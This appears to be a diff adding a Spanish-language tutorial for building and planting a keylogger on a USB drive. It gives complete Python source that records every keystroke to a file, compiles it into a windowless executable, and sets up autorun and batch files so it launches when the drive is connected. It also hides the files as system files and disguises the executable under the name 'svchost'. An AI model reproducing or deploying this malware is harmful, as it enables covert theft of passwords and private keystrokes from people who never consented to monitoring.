@@ -1,0 +1,171 @@
+Guía Completa: Crear Keylogger para USB
+
+PASO 1: INSTALAR PROGRAMAS NECESARIOS
+
+1. Abrir la ventana de comandos:
+   - Presionar Tecla Windows + R
+   - Escribir: cmd
+   - Presionar Enter
+
+2. Ejecutar estos comandos uno por uno:
+   pip install pynput
+   (esperar a que termine)
+
+   pip install pyinstaller
+   (esperar a que termine)
+
+PASO 2: CREAR EL ARCHIVO KEYLOGGER
+
+1. Abrir Bloc de notas:
+   - Presionar Tecla Windows
+   - Escribir: bloc de notas
+   - Abrirlo
+
+2. Copiar y pegar este código exactamente:
+
+import os
+import time
+from pynput import keyboard
+
+class SimpleKeylogger:
+    def __init__(self):
+        self.log = ""
+        self.filename = "system_log.txt"
+        self.setup_logfile()
+        
+    def setup_logfile(self):
+        try:
+            with open(self.filename, "w") as f:
+                f.write(f"Inicio: {time.ctime()}\n")
+                f.write("=" * 40 + "\n")
+        except:
+            pass
+    
+    def on_press(self, key):
+        try:
+            self.log += str(key.char)
+        except:
+            if key == keyboard.Key.space:
+                self.log += " "
+            elif key == keyboard.Key.enter:
+                self.log += "\n"
+            elif key == keyboard.Key.tab:
+                self.log += "\t"
+            else:
+                self.log += f"[{str(key)}]"
+        
+        if len(self.log) > 30:
+            self.save_log()
+    
+    def save_log(self):
+        try:
+            with open(self.filename, "a", encoding="utf-8") as f:
+                f.write(self.log)
+            self.log = ""
+        except:
+            pass
+    
+    def start(self):
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+if __name__ == "__main__":
+    logger = SimpleKeylogger()
+    logger.start()
+
+3. Guardar el archivo:
+   - Click en Archivo → Guardar como...
+   - Nombre: keylogger.py
+   - Tipo: Todos los archivos
+   - Guardar en: Escritorio
+
+PASO 3: CONVERTIR EN EJECUTABLE
+
+1. En la ventana de comandos escribir:
+   cd Desktop
+   (presionar Enter)
+
+2. Escribir este comando:
+   pyinstaller --onefile --windowed keylogger.py
+   (esperar 1-2 minutos)
+
+PASO 4: CREAR ARCHIVO AUTORUN
+
+1. Abrir Bloc de notas nuevo
+2. Copiar y pegar este texto:
+
+[autorun]
+open=keylogger.exe
+shellexecute=keylogger.exe
+action=Abrir USB
+label=Mi USB
+
+3. Guardar como:
+   - Nombre: autorun.inf
+   - Tipo: Todos los archivos
+   - Guardar en: Escritorio
+
+PASO 5: PREPARAR EL USB
+
+1. Conectar USB a la computadora
+2. Ir al Escritorio y abrir la carpeta "dist"
+3. Copiar estos archivos al USB:
+   - keylogger.exe (desde carpeta dist)
+   - autorun.inf (desde Escritorio)
+
+PASO 6: PROBAR FUNCIONAMIENTO
+
+1. En el USB hacer doble click en keylogger.exe
+2. Escribir cualquier texto en el teclado
+3. Buscar en el USB el archivo system_log.txt
+4. Verificar que contiene el texto escrito
+
+Para ejecución automática:
+- Desconectar USB
+- Volver a conectar
+- Debe ejecutarse solo
+
+PASO 7: CONFIGURACIONES ADICIONALES
+
+Si no funciona el auto-run en Windows 11:
+
+Opción 1: Ejecutar manualmente el keylogger.exe
+
+Opción 2: Crear archivo iniciador.bat en el USB con este contenido:
+@echo off
+start keylogger.exe
+exit
+
+Y cambiar el autorun.inf a:
+[autorun]
+open=iniciador.bat
+action=Abrir USB
+
+PARA OCULTAR ARCHIVOS EN USB:
+
+1. Abrir ventana de comandos
+2. Navegar a la unidad USB (ej: E:)
+3. Ejecutar:
+   attrib +h +s keylogger.exe
+   attrib +h +s autorun.inf
+
+PARA DAR NOMBRE MÁS DISCRETO:
+
+Recompilar con:
+pyinstaller --onefile --windowed --name "svchost" keylogger.py
+
+Luego usar svchost.exe en lugar de keylogger.exe
+
+SOLUCIÓN DE PROBLEMAS:
+
+- Si no se crea system_log.txt: ejecutar como Administrador
+- Si da error de Python: reinstalar Python desde python.org
+- Si no compila: verificar que keylogger.py está en el Escritorio
+- Si no ejecuta: probar en otra computadora con Windows
+
+ARCHIVOS FINALES EN USB:
+- keylogger.exe (o svchost.exe)
+- autorun.inf
+- system_log.txt (se crea automáticamente)
+
+NOTA: El keylogger funciona solo cuando el archivo .exe está ejecutándose.
